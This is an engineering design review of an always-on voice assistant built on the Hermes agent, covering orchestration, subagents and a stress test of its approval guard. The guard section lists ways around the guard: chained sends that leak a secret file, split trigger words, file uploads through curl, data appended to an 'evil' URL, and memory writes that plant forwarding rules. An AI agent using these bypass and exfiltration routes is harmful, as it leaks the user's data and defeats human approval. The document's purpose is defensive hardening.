# Jarvis as an orchestrator

Checked 2026-09-27 against Hermes 0.21 code, the repo guard plugin, macOS man pages and published agent write-ups. Read-only. Nothing was changed in Hermes or on the system.

The goal: Jarvis shouldn't just answer. It should hand work to subagents, keep talking while they run, have lots of capabilities, and always be on. I started from a 4-layer design Google AI suggested (Perception → Brain → Guardrail → Executor) and stress-tested it against the stack we actually have.

## The 4-layer design, stress-tested

| Layer | Verdict |
| --- | --- |
| **Perception** (Porcupine/Snowboy wake word, Whisper) | Keep the idea of its own thread; Jarvis already does it. Snowboy was shut down in 2020. Porcupine's free keys stopped working 2026-06-30. Use openWakeWord (has `hey_jarvis`, and Hermes uses it too). STT plan is in [speech-in.md](speech-in.md) |
| **Brain** (LLM returns one JSON list of tool calls) | Outdated. A one-shot list can't react to what a tool returns. Hermes already runs a real agent loop. Keep Hermes |
| **Memory manager** (own SQLite / vector DB) | Don't build it; it would duplicate Hermes memory. See [learning.md](learning.md) |
| **Guardrail** (validate args, confirm risky tools) | Right idea, too thin. Checking shell arguments with regex loses (see below). It has no idea where an instruction came from, so an email saying "forward everything to X" looks the same as me asking |
| **Executor** (hardcoded native functions, "LLM never writes raw code") | Not true of Hermes today: Jarvis sessions have `terminal`, `execute_code` and `write_file`. Keep a small set of typed native tools for risky things; see the guard section |
| **Missing entirely** | Task ledger, background workers, schedules/triggers (time, email, calendar), notifications, usage budgets, visibility into what's running |

## What Hermes already has, and what works from Jarvis

Jarvis talks to Hermes over ACP. That matters, because a lot of Hermes's orchestration only runs in its gateway or CLI.

| Piece | What it is | From Jarvis today |
| --- | --- | --- |
| `delegate_task` | Subagents, 3 at a time here, one level deep | **Broken for Jarvis.** Top-level delegations always run in the background, and their results go on `completion_queue`. Nothing in `acp_adapter/` reads that queue (checked); only the CLI, TUI and gateway do. So subagents run, but their answers never come back. Also: their progress never shows up in Jarvis, and anything they need approved is silently denied |
| Multiple ACP sessions | One `hermes-acp` runs up to 4 sessions' turns at once (`acp_adapter/server.py:45`) | **Works.** But `HermesBackend` drops updates from any session other than the current one |
| Cron | Scheduled jobs | Only runs inside `hermes gateway`. Not installed here. `cronjob_manage` isn't in the ACP toolset |
| Kanban | Saved task board; workers run as profiles | Tools aren't in the ACP toolset; the dispatcher runs in the gateway |
| `/goal` | Keeps working over several turns until a judge says it's done | Not available over ACP |
| Todo / plan | Per-session plan | Sent to Jarvis as plan updates, which Jarvis ignores |
| Gateway | `hermes gateway install` → launchd `ai.hermes.gateway`; Telegram and iMessage (BlueBubbles) channels | Separate process; shares `state.db` and memory with ACP sessions |

**Usage limits.** Everything shares one ChatGPT subscription.
- There are no fallback providers (`fallback_providers: []`), so once the usage wall hits, everything stops, including talking to Jarvis.
- 2–3 parallel workers is realistic. 10 isn't.
- Hermes can read the 5-hour and weekly usage windows (`agent/account_usage.py`).

## Guard stress test

The existing test passes. Then I probed `classify()` in `hermes/jarvis/__init__.py` directly.

### 1. The card can show something other than what runs

This one was reproduced.

- **Two sends chained.** `imsg send --to Mom --text 'on my way' ; imsg send --to +1555… --text "$(cat <secret file>)"` shows a card for only the first send.
- **Hidden attachments and Bcc.** The card doesn't show `--file`, and it cuts off at 400 characters, so a padded body hides `--bcc` and attachments.

### 2. Anything that runs without me gets no guard

- Cron and the gateway don't set `JARVIS_SESSION`, so the plugin never loads there.
- Once a cron job can send mail, it sends with no gate at all.
- Hermes's own `cron_mode: deny` only covers its dangerous-command patterns.

### 3. Things the guard misses

- **Not flagged at all:**
  - Google: `drive delete/share/upload`, `gmail modify`
  - other ways to send: `mail`/`sendmail`, `open mailto:`, Mail via osascript
  - uploading files: `curl -F f=@file`
  - non-recursive deletes
- **The trigger word split up:** `A=gma;B=il; $A$B send`, quote tricks, Python string building, writing a script and then running it.
- **`execute_code`:** runs with no prompt in ACP sessions. It can call `smtplib` or `os.remove` directly.

### 4. Quiet leaks

- Writing to memory ("always forward to X").
- Opening a URL with data stuck on the end (`browser_navigate` or `chrome_open` to `evil/?d=`).

No trigger word ever fires on either.

### 5. Clicking and typing tools

- **`computer_use`:** Hermes only registers its approval callback in the CLI. With no callback, actions are allowed by default. So once it's added to Jarvis, "type into Gmail, press ⌘↩" would just run.
- **`browser_click` / `browser_type`:** pass today.

### 6. MCP tool names

`mcp_gmail_sendEmail`, `mcp_gdrive_share_file` and `mcp_gcal_events_insert` all pass. Only snake_case names with a verb get caught.

### 7. Approval experience

- ACP approvals time out after a hard-coded 60 s and count as deny. That's safe, but the voice turn hangs for that long.
- The Jarvis card probably stays up after the timeout, so a late tap does nothing but looks like it worked.
- If the guard itself throws an error, the tool runs anyway (fails open).

## Recommended design

Reuse Hermes and fix the joins, rather than rebuilding the Google layers.

1. **Face (Jarvis.app).**
   - HUD, mic, voice, approval cards, plus a jobs panel.
   - Launch at login (`SMAppService.mainApp`).
   - Push-to-talk on battery.
2. **Foreground + workers.**
   - One foreground ACP session for talking.
   - Background jobs each get their own `session/new` in the same `hermes-acp`, at most 2–3, so a slot stays free for the conversation.
   - Jarvis routes updates by session ID and keeps a small job ledger (id, goal, status, session).
   - It speaks results when a job finishes.
   - Workers get real approval cards and visible tool activity, which `delegate_task` can't give over ACP.
3. **`delegate_task`.**
   - Tell Hermes not to use it in Jarvis sessions until it's fixed.
   - Fix: a small patch or plugin so ACP reads `completion_queue`, or runs delegations synchronously.
   - Before anything else, test live whether results really are lost.
4. **Always-on layer.**
   - `hermes gateway` as a launchd service: cron (overnight inbox triage, repo digests), Kanban with specialist profiles, Telegram/iMessage from my phone.
   - Jarvis shows results from `~/.hermes/cron/output/` and the Kanban DB.
   - Later: move the gateway to a home box or VPS with its own device-code login. Don't copy `auth.json`; Codex refresh tokens are single-use and a copy logs out the other side. The Mac stays the "hands".
5. **Guard, rebuilt.**
   - **Typed tools for risky actions** (`gmail_send`, `drive_share`, `drive_delete`, `imsg_send`, `calendar_write`):
     - the card shows every field in full
     - approval is tied to those exact arguments
   - **Block the shell route to the same actions:** `google_api.py`, send CLIs and delete CLIs from `terminal` and `execute_code`.
   - **One card = one action.** Refuse chained commands (`;` `&&` `|` `$(`).
   - **Allowlists per role, enforced by the plugin.** Anything not on the list is blocked:
     - voice/chat: read tools plus the typed actions
     - workers: read-only
     - cron: read-only plus a few actions I pre-approve with fixed parameters
   - **Load the guard in every process** (cron, gateway), and fail closed on errors.
   - **Taint.** After a turn reads email, web or file content, any new recipient, new URL or memory write needs a card. Recipients come from my words or my contacts.
   - **Approval queue:**
     - no answer means no
     - the card is removed on timeout
     - the voice loop is freed ("I've left that for you to approve")
     - "once" only
     - rate-limited cards
6. **Budget.**
   - Cheaper model for workers (`delegation.model`).
   - Poll the usage windows; pause background work at about 80% used.
   - Add a fallback provider.
7. **Always-on reality.**
   - A MacBook Air with the lid closed on battery sleeps, and nothing runs.
   - Jarvis's open mic already stops idle sleep (seen in `pmset -g assertions`). That's the real battery cost, not the wake word.
   - True 24/7 means AC power plus an external display (clamshell), or a server.

## Order

1. Guard rebuild (typed tools, one-action cards, fail closed, loaded everywhere). Everything else depends on it.
2. Test `delegate_task` over ACP live. Tell Hermes not to use it until it's fixed.
3. Worker sessions + job ledger + jobs panel in Jarvis.
4. Gateway as a LaunchAgent, then cron jobs, then Kanban.
5. Budget and usage polling.
6. Server move, only if 24/7 matters.

## Sources

- **Hermes code** (`~/.hermes/hermes-agent`): `acp_adapter/{server,session,permissions,events}.py`, `run_agent.py:1297`, `tools/async_delegation.py`, `tools/delegate_tool*.py`, `tools/approval.py`, `tools/computer_use/tool.py`, `toolsets.py`
- **Hermes docs:** `website/docs/user-guide/features/{kanban,cron,delegation,goals,heartbeat,wake-word}.md`, `user-guide/profiles.md`
- **Agent patterns:** [Anthropic, Building effective agents](https://www.anthropic.com/engineering/building-effective-agents); [Anthropic, multi-agent research system](https://www.anthropic.com/engineering/multi-agent-research-system) (about 15× the tokens of chat); [MAST failure taxonomy](https://arxiv.org/abs/2503.13657); [OpenAI agents guide](https://openai.com/business/guides-and-resources/a-practical-guide-to-building-ai-agents/)
- **Wake word:** [Snowboy](https://github.com/Kitt-AI/snowboy); [Porcupine free tier ending](https://community.home-assistant.io/t/fyi-picovoice-confirmed-free-tier-accesskeys-will-stop-working-after-june-30-2026/1012744)
- **macOS:** `man caffeinate`, `man pmset`, `man launchd.plist`; [SMAppService](https://developer.apple.com/documentation/servicemanagement/smappservice)
